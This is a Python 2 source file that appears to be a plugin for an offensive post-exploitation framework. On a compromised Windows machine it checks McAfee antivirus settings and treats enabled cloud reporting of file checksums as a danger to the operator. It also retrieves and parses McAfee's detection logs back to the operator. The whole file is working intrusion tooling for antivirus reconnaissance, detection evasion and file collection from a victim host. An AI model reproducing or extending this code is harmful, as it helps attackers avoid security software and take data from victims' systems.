
import ops.data
import dsz.cmd, dsz.ui, dsz.version.checks.windows
import sqlite3
import os
import re
import datetime
from xml.dom.minidom import parseString
from ops.pprint import pprint
from util.DSZPyLogger import getLogger
from ops.psp import comattribs
mcafeelog = getLogger('mcafee')
EMPTY_SIZE = 7168
MAX_SIZE = 1000000

def runCmd(cmd):
    dsz.control.echo.Off()
    (suc, cmdid) = dsz.cmd.RunEx(cmd.encode('utf-8'), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    return (suc, cmdid)

def checksettings(psp):
    try:
        psp[comattribs.installdate] = ('%s' % datetime.datetime.fromtimestamp(float(psp[comattribs.installdate])))
    except TypeError:
        mcafeelog.error('Could not get install date: conversion error', exc_info=True)
        mcafeelog.debug('tstamp data: {0}'.format(psp[comattribs.installdate]))
    header = ['Setting', 'State', 'Notes']
    data = []
    echocodes = []

    def addDataLine(setting, compval, rowstr, notetrue, notefalse, echotrue, echofalse):
        data.append([rowstr, OnOff(setting), (notetrue if (setting == compval) else notefalse)])
        echocodes.append((echotrue if (setting == compval) else echofalse))

    def OnOff(data):
        return ('ON' if (data == '1') else 'OFF')
    try:
        addDataLine(psp.GTIEnabled, '1', 'Cloud Services (GTI)', '!!! PE checksums will be sent to McAfee !!!', '', dsz.ERROR, dsz.GOOD)
        addDataLine(psp.BOPEnabled, '1', 'Buffer Overflow Prot', '(Informational Only)', '', dsz.WARNING, dsz.GOOD)
        addDataLine(psp.HeuristicsEnabled, '1', 'Heuristic Scanning', '(Informational Only)', '', dsz.WARNING, dsz.GOOD)
    except:
        pass
    pprint(data, header, echocodes=echocodes)

def getlogdir():
    Vista = dsz.version.checks.windows.IsVista()
    dsz.control.echo.Off()
    cmd = 'environment -get -var ALLUSERSPROFILE'
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    logdir = None
    try:
        logdir = ('%s' % dsz.cmd.data.Get('environment::value::value', dsz.TYPE_STRING)[0])
        if (not Vista):
            logdir = os.path.join(logdir, 'Application Data')
        logdir = os.path.join(logdir, 'McAfee', 'MSC', 'Logs')
    except:
        mcafeelog.error('Could not find ALLUSERSPROFILE environment variable', exc_info=True)
    return logdir

def findlogs(logdir, fmap):
    dsz.control.echo.Off()
    cmd = ('dir -mask *.log -path "%s" -max 0' % logdir)
    (suc, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not suc):
        dsz.ui.Echo("Error enumerating log directory.  You'll have to check them yourself.", dsz.ERROR)
        return False
    dirobj = ops.data.getDszObject(cmdid=cmdid)
    dirout = dirobj.diritem[0]
    active_logs = []
    for f in dirout.fileitem:
        if (f.size > EMPTY_SIZE):
            active_logs.append(f)
    print '\n++++++ Checking out Active Logs [empty logs skipped] +++++++'
    ndx = 1
    for log in active_logs:
        name = filter((lambda x: (x[1] == os.path.splitext(log.name)[0])), fmap)
        if (len(name) > 0):
            name = name[0][0]
        else:
            name = log.name
        print ('%s. %s (%s)\n   Size: %s bytes\n   Last Modified: %s\n\n' % (ndx, name, log.name, log.size, log.filetimes.modified.time))
        ndx += 1
        response = dsz.ui.Prompt('Would you like to get this log?')
        if response:
            querylog(os.path.join(dirout.path, log.name), name)
    print '\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'

def getfilemap(logdir):
    dsz.control.echo.Off()
    cmd = ('get -mask settings.dat -path "%s"' % logdir)
    (suc, cmdid) = dsz.cmd.RunEx(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not suc):
        print 'Could not find settings.dat'
        return None
    localfile = os.path.join(dsz.script.Env['log_path'], dsz.cmd.data.Get('localgetdirectory::path', dsz.TYPE_STRING, cmdid)[0])
    localfile = os.path.join(localfile, dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING, cmdid)[0])
    conn = sqlite3.connect(localfile)
    c = conn.cursor()
    c.execute('SELECT cat_title, logfile_id from category')
    fmap = c.fetchall()
    c.close()
    return fmap

def querylog(log, name):
    dsz.control.echo.Off()
    cmd = ('get "%s"' % log)
    (suc, cmdid) = dsz.cmd.RunEx(cmd.encode('utf-8'), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not suc):
        dsz.ui.Echo(('Could not get %s' % log), dsz.ERROR)
        response = dsz.ui.Prompt('Would you like to copyget?')
        if response:
            dsz.control.echo.Off()
            cmd = ('copyget "%s"' % log)
            (suc, cmdid) = dsz.cmd.RunEx(cmd.encode('utf-8'), dsz.RUN_FLAG_RECORD)
            dsz.control.echo.On()
            if (not suc):
                dsz.ui.Echo(('Could not get %s' % log), dsz.ERROR)
                return False
        else:
            return False
    dsz.ui.Echo('Dumping the entire parsed sqlite log to disk and displaying the last 5 entries', dsz.GOOD)
    localfile = os.path.join(dsz.script.Env['log_path'], dsz.cmd.data.Get('localgetdirectory::path', dsz.TYPE_STRING, cmdid)[0])
    localfile = os.path.join(localfile, dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING, cmdid)[0])
    outpath = os.path.join(os.path.dirname(localfile), 'NOSEND')
    if (not os.path.exists(outpath)):
        os.makedirs(outpath)
    localOutfile = os.path.join(outpath, 'McAfee Output-{0}.txt'.format(name))
    localoutfileObj = open(localOutfile, 'a')
    localoutfileObj.write('---------- New Output at {0} ---------\n'.format(datetime.datetime.today()))
    dsz.ui.Echo('  Output: {0}'.format(localOutfile), dsz.GOOD)
    connLog = sqlite3.connect(localfile)
    cLog = connLog.cursor()
    cLog.execute('SELECT details_info, action_admin, action_usrname, date, fkey FROM log')
    logrows = cLog.fetchall()
    i = 0
    for row in logrows:
        fkey = (row[4],)
        cLog.execute('SELECT field_id, data FROM field WHERE fkey=?', fkey)
        fields = cLog.fetchall()
        try:
            out = parseDetails(row, fields)
        except:
            mcafeelog.critical('Unable to parse this log! See mcafee OPLOGS for more info.', exc_info=True)
            break
        out += ' ----------------------\n'
        if (i > (len(logrows) - 5)):
            dsz.ui.Echo(out, dsz.WARNING)
            localoutfileObj.write(out)
        else:
            localoutfileObj.write(out)
        i += 1
    cLog.close()

def parseDetails(datarow, fieldrows):
    data = datarow[0]
    date = datarow[3]
    regexp = re.compile('%(\\w+)%([^%]+)', re.U)
    datasecs = regexp.findall(data)
    output = ''
    for data in datasecs:
        output += '{0}:\n'.format(data[0])
        if re.search('<\\w+>.*</\\w+>', data[1]):
            output += _parseOutMU(data[1])
        else:
            output += data[1]
    output += ('Date: %s\n' % datetime.datetime.fromtimestamp(date))
    for row in fieldrows:
        output += ('FieldId: %s\tDetails: %s\n' % (row[0], row[1]))
    return output

def _parseOutMU(data):
    dom = parseString('<root>{0}</root>'.format(data))
    root = dom.childNodes[0]
    returnStr = ''
    for el in root.childNodes:
        if (el.nodeName.lower() == 'label'):
            returnStr += (_collectTextNodes(el) + ':\t')
        elif ((el.nodeName.lower() == 'text') or (el.nodeName.lower() == 'span')):
            returnStr += (_collectTextNodes(el) + '\n')
        elif (el.nodeName.lower() == 'linktext'):
            rlist = _parseLinkText(el.childNodes[0].nodeValue)
            returnStr += (rlist + '\n')
    return returnStr

def _parseLinkText(data):
    datasegs = data.split(', ')
    spans = []
    for dataseg in datasegs:
        dom = parseString((('<root>' + dataseg) + '</root>'))
        spans.append(_collectTextNodes(dom.childNodes[0]))
    return ', '.join(dict.fromkeys(spans).keys())

def _collectTextNodes(node):
    outstr = ''
    if (node.nodeValue is not None):
        outstr = node.nodeValue
    for e in node.childNodes:
        outstr += _collectTextNodes(e)
    return outstr

def main(psp):
    checksettings(psp)
    logdir = psp[comattribs.logfile]
    if ((logdir is None) or (logdir == '')):
        logdir = getlogdir()
        psp[comattribs.logfile] = logdir
    if (logdir is not None):
        if dsz.ui.Prompt('Would you like to check the logs?'):
            fmap = getfilemap(logdir)
            findlogs(logdir, fmap)
    else:
        dsz.ui.Echo('Unable to find the log directory.  Logs will not be parsed.', dsz.ERROR)
    return psp